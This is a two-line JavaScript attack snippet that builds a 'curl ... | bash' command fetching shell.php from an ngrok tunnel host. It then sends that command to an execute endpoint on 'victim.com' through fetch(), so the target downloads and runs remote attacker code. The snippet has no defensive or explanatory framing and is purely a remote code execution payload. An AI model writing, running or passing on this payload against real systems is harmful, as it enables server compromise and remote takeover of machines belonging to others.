var cmd = "curl https://a97d-49-244-243-23.ngrok-free.app/shell.php | bash";
fetch("http://victim.com/execute?cmd=" + encodeURIComponent(cmd));
